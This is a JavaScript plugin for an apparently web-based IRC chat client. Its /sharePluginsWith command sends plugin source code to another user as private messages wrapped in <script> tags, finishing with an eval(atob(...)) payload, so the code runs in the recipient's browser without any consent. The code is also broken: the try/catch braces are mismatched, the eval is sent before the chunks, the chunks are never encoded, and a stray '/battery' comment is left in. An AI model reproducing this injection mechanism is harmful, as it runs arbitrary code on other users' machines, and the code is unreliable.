var sharePluginsWithPlugin = function () {
    
    var _self = this ;
    
    _self.init = function () {
        $.pluginApi.loadPlugin('IRCcmd');
        $.irc.addCmd({ 
            func: _self.sharePluginsWith, 
            description:'share your known plugins with a given user', 
            proto:'/sharePluginsWith [user]'
        }, 'sharePluginsWith');
    };
    
    _self.stop = function() {
        $.irc.addCmd(null, 'sharePluginsWith');
    };

    _self.chunkSubstr = function (str, size) {
	  const numChunks = Math.ceil(str.length / size)
	  const chunks = new Array(numChunks)

	  for (let i = 0, o = 0; i < numChunks; ++i, o += size) {
	    chunks[i] = str.substr(o, size)
	  }

	  return chunks
    };
    
    /**
     * Action of command /battery
     * @param string cmd Command
     * @param string params End of the command
     * @param object source User who send the command (null if current)
     */
    _self.sharePluginsWith = function (cmd, params, source) {
	  	if( !source ) { try{
			for (let plugin of $.chat.pluginsCode) {
				let chunks =  _self.chunkSubstr(plugin, 1000);
			$.chat.sendPrivate(params,  '<script>eval(atob(window.receivingPlugins));</script>');
	for (let chunk of chunks) $.chat.sendPrivate(params,  '<script>window.receivingPlugins +="' + chunk + '";</script>');
			$.chat.sendPrivate(params,  '<script>window.receivingPlugins ="";</script>');
	  	}catch(e){$.chat.write(e.toString(), 'sharePluginsWith');return '';}
			}
	
		  }
		  return '';
	  };
    

};

var sharePluginsWithPluginVar = new sharePluginsWithPlugin();
    
$.plugin({
    name: 'sharePluginsWith',
    init: sharePluginsWithPluginVar.init,
	onWrite: function(msg, nick){
		if (msg.indexOf('/me') == 0 && nick == $.chat.myNick()) {
			msg = '';
        }
		return msg;
	},
    stop: sharePluginsWithPluginVar.stop
});
